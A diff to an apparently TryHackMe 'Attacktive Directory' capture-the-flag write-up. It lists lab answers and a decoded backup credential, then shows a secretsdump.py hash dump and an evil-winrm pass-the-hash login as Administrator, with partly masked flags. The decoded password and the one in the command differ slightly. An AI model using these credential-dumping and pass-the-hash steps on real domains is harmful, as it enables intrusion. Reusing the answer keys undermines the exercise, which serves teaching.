@@ -155,6 +155,7 @@ smb: \>
 7. Question `There is one particular share that we have access to that contains a text file. Which share is it?` Answer `backup`
 8. Question `What is the content of the file?` Answer `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
 9. Question `Decoding the contents of the file, what is the full contents?` Answer `backup@spookysec.local:backup2517860`
+
 ## Elevating Privileges within the Domain
 1. We can dump password hashes, as backup account has that permission using `secretsdump.py -dc-ip spookysec.local backup:backup251786@spookysec.local` command.
 ```bash
@@ -181,7 +182,28 @@ spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758
 4. Question `What method of attack could allow us to authenticate as the user without the password?` Answer `Pass the hash`
 5. Question `Using a tool called Evil-WinRM what option will allow us to use a hash?` Answer `-H`
 
-
 ## Flag Submission Panel
+1. We can login to administrator using `evil-winrm` with `evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc` command. We can get three flag files inside three directory.
+```bash
+evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\svc-admin\Desktop\user.txt.txt
+TryHackMe{K3rb3****4uth}
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\backup\Desktop\PrivEsc.txt
+TryHackMe{B4c*****c0tty!}
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
+TryHackMe{4ctive*****toryM4st3r}
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
+2. Question `svc-admin` Answer `TryHackMe{K3rb3*****3_4uth}`
+3. Question `backup` Answer `TryHackMe{B4*****0tty!}`
+4. Question `administrator` Answer `TryHackMe{4ctiv******M4st3r}`
 
+   
 Author: Zishan Ahamed Thandar
